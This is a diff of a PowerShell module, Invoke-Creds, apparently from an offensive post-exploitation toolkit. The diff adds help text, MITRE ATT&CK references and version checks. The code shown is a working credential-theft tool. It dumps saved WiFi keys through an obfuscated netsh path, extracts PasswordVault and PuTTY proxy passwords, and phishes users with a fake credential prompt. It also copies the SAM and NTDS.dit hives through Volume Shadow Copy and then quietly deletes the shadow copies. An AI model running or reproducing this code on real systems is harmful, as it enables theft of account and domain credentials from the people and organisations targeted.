@@ -1,14 +1,71 @@
 function Invoke-Creds {
+<# 
+
+.SYNOPSIS
+	Several methods for obtaining credentials from the target system.
+
+.PARAMETER Help
+	Shows Detailed Help.	
+	
+.PARAMETER List
+	Shows Brief Command Help.
+
+.PARAMETER WifiCreds
+	Dumps saved WiFi Credentials.
+
+.PARAMETER IeCreds
+	Dumps saved Internet Explorer/Edge Credentials.
+
+.PARAMETER AuthPrompt
+	Invokes an authentication prompt to the target and captures any entered credentials.
+
+.PARAMETER PuttyKeys
+	Dumps any saved putty sessions/keys/passwords.
+
+.PARAMETER CopySAM
+	Utilizes Volume Shadow Copy to copy the SAM, SYSTEM and SECURITY files from C:\windows\system32\config. These can be parsed offline.
+
+.PARAMETER CopyNtds
+	Utilizes Volume Shadow Copy to copy the NTDS.dit and SYSTEM files. These files can be parsed offline.
+
+
+.EXAMPLE 
+	PS> Invoke-Creds -WifiCreds
+
+.EXAMPLE
+	PS> Invoke-Creds -PuttyKeys
+
+.EXAMPLE
+	PS> Invoke-Creds -CopySAM -Dest C:\temp\
+
+.NOTES
+	Author: Fabrizio Siciliano (@0rbz_)
+
+#>
+
 [CmdletBinding()]
 param (
+	[Parameter(Position=1)]
 	[Switch]$Help,
 	[Switch]$List,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$WifiCreds,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$IeCreds,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$AuthPrompt,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$PuttyKeys,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$CopySAM,
 	[String]$Dest,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$CopyNtds,
 	[String]$Dest2=$Dest
 )
@@ -20,42 +77,50 @@ param (
  --------------------------------
  Available Invoke-Creds Commands:
  --------------------------------
- ---------------------------------------------------------------------
-  -WiFiCreds
- ---------------------------------------------------------------------
+ |---------------------------------------------------------------------|
+ | -WiFiCreds                                                          |
+ |---------------------------------------------------------------------|
 
    [*] Description: Dumps saved WiFi Credentials.
 
-   [*] Usage: Invoke-Creds -WiFiCreds                   
-
- ---------------------------------------------------------------------
-  -IeCreds
- ---------------------------------------------------------------------
-
-   [*] Description: Dumps saved IE Credentials.
+   [*] Usage: Invoke-Creds -WiFiCreds
    
-   [*] Usage: Invoke-Creds -IeCreds                                    
+   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)
 
- ---------------------------------------------------------------------
-  -AuthPrompt
- --------------------------------------------------------------------- 
+ |---------------------------------------------------------------------|
+ | -IeCreds                                                            |
+ |---------------------------------------------------------------------|
+
+   [*] Description: Dumps saved Internet Explorer/Edge Credentials.
+   
+   [*] Usage: Invoke-Creds -IeCreds
+   
+   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)
+
+ |---------------------------------------------------------------------|
+ | -AuthPrompt                                                         |
+ |---------------------------------------------------------------------| 
 
    [*] Description: Invokes an authentication prompt to the target 
        and captures any entered credentials.
 
    [*] Usage: Invoke-Creds -AuthPrompt
+   
+   [*] Mitre ATT&CK Ref: T1056 (Input Capture)
 
- ---------------------------------------------------------------------
-  -PuttyKeys
- --------------------------------------------------------------------- 
+ |---------------------------------------------------------------------|
+ | -PuttyKeys                                                          |
+ |---------------------------------------------------------------------| 
 
    [*] Description: Dumps any saved putty sessions/keys/passwords.
 
    [*] Usage: Invoke-Creds -PuttyKeys
    
- ---------------------------------------------------------------------
-  -CopySAM [-Dest] C:\temp\
- --------------------------------------------------------------------- 
+   [*] Mitre ATT&CK Ref: T1081 (Credentials in Files)
+   
+ |---------------------------------------------------------------------|
+ | -CopySAM [-Dest] dest                                               |
+ |---------------------------------------------------------------------| 
 
    [*] Description: Utilizes Volume Shadow Copy to copy the SAM, SYSTEM
        and SECURITY files from C:\windows\system32\config. These can be 
@@ -63,22 +128,28 @@ param (
 
    [*] Usage: Invoke-Creds -CopySAM -Dest C:\temp\
    
- ---------------------------------------------------------------------
-  -CopyNtds [-Dest] C:\temp\
- --------------------------------------------------------------------- 
+   [*] Mitre ATT&CK Ref: T1003 (Credential Dumping)
+   
+ |---------------------------------------------------------------------|
+ | -CopyNtds [-Dest] dest                                              |
+ |---------------------------------------------------------------------| 
 
    [*] Description: Utilizes Volume Shadow Copy to copy the NTDS.dit 
        and SYSTEM files. These files can be parsed offline.
 
    [*] Usage: Invoke-Creds -CopyNtds -Dest C:\temp\
    
+   [*] Mitre ATT&CK Ref: T1003 (Credential Dumping)
+   
+ \---------------------------------------------------------------------/
+   
 "@
 	}
 	elseif ($List -eq $True) {
 		Write @"  
 
- Invoke-Creds Command List:
- --------------------------
+ Invoke-Creds Brief Command Usage:
+ ---------------------------------
  Invoke-Creds -WiFiCreds
  Invoke-Creds -IeCreds
  Invoke-Creds -AuthPrompt
@@ -89,18 +160,32 @@ param (
 "@
 	}
 	elseif ($WifiCreds) {
-	# https://jocha.se/blog/tech/display-all-saved-wifi-passwords
-		(C:\??*?\*3?\ne?s?.e?e wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ "Wireless Profile"=$name;"Password"=$pass }} | Format-Table -AutoSize
-
+		
+		# check for PS version in the event this is invoked from a stand-alone cmdlet
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
+		else {
+			# https://jocha.se/blog/tech/display-all-saved-wifi-passwords
+			(C:\??*?\*3?\ne?s?.e?e wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ "Wireless Profile"=$name;"Password"=$pass }} | Format-Table -AutoSize
+		}
 	}
 	elseif ($IeCreds) {
-	# https://www.toddklindt.com/blog/_layouts/mobile/dispform.aspx?List=56f96349-3bb6-4087-94f4-7f95ff4ca81f&ID=606
-		[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-		$vault = New-Object Windows.Security.Credentials.PasswordVault
-		$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Format-List
+		# check for PS version in the event this is invoked from a stand-alone cmdlet
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
+		else {
+			# https://www.toddklindt.com/blog/_layouts/mobile/dispform.aspx?List=56f96349-3bb6-4087-94f4-7f95ff4ca81f&ID=606
+			[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+			$vault = New-Object Windows.Security.Credentials.PasswordVault
+			$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | Format-List
+		}
 	}
 	elseif ($AuthPrompt) {
-		$c = Get-Credential -Message "Credentials Required For $env:userdomain\$env:username"
+		$c = Get-Credential
 		$u = $c.GetNetworkCredential().username
 		$p = $c.GetNetworkCredential().password
 
@@ -108,19 +193,26 @@ param (
 		Write "Password: $p"
 	}
 	elseif ($PuttyKeys) {
-		$SavedSessions = (Get-Item HKCU:\Software\SimonTatham\PuTTY\Sessions\*).Name | ForEach-Object { $_.split("\")[5]}
-			
-		foreach ($Session in $SavedSessions) {
-			$HostName = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).Hostname
-			$PrivateKey = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).PublicKeyFile
-			$Username = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).UserName
-			$ProxyHost = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyHost
-			$ProxyPassword = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPassword
-			$ProxyPort = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPort
-			$ProxyUsername = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyUsername
-			$Results = "`nSession Name: $Session`nHostname/IP: $HostName`nUserName: $UserName`nPrivate Key: $PrivateKey`nProxy Host: $ProxyHost`nProxy Port: $ProxyPort`nProxy Username: $ProxyUsername`nProxy Password: $ProxyPassword"
+		# check for PS version in the event this is invoked from a stand-alone cmdlet
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
+		else {
+			$SavedSessions = (Get-Item HKCU:\Software\SimonTatham\PuTTY\Sessions\*).Name | ForEach-Object { $_.split("\")[5]}
+				
+			foreach ($Session in $SavedSessions) {
+				$HostName = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).Hostname
+				$PrivateKey = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).PublicKeyFile
+				$Username = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).UserName
+				$ProxyHost = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyHost
+				$ProxyPassword = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPassword
+				$ProxyPort = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPort
+				$ProxyUsername = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyUsername
+				$Results = "`nSession Name: $Session`nHostname/IP: $HostName`nUserName: $UserName`nPrivate Key: $PrivateKey`nProxy Host: $ProxyHost`nProxy Port: $ProxyPort`nProxy Username: $ProxyUsername`nProxy Password: $ProxyPassword"
 
-			Write $Results
+				Write $Results
+			}
 		}
 	}
 	elseif ($CopySAM -and $Dest) {
@@ -130,7 +222,7 @@ param (
 		$SAMExists = (Test-Path "C:\windows\system32\config\SAM") 
 		
 		if ($CheckElevated -and $SAMExists) {
-
+		
 			# create shadow copy
 			$class = [WMICLASS]"root\cimv2:win32_shadowcopy"
 			$class.create("C:\", "ClientAccessible")
@@ -151,10 +243,10 @@ param (
 			(C:\windows\system32\vssadmin.exe delete shadows /For=C: /quiet)
 		}
 		elseif (!$CheckElevated) {
-			Write "This process requires elevation. Make sure you're admin first."
+			Write "`n [!] This process requires elevation. Make sure you're admin first.`n"
 		}
 		elseif (!$SAMExists) {
-			Write " [!] Can't find SAM file."
+			Write "`n [!] Can't find SAM file.`n"
 		}
 	}
 	elseif ($CopyNtds -and $Dest) {
@@ -180,10 +272,10 @@ param (
 			(C:\windows\system32\vssadmin.exe delete shadows /For=C: /quiet)
 		}
 		elseif (!$CheckElevated) {
-			Write "This process requires elevation. Make sure you're admin first."
+			Write "`n [!] This process requires elevation. Make sure you're admin first.`n"
 		}
 		elseif (!$NTDSExists) {
-			Write " [!] Can't find NTDS.dit file."
+			Write "`n [!] Can't find NTDS.dit file.`n"
 		}
 	}
 }
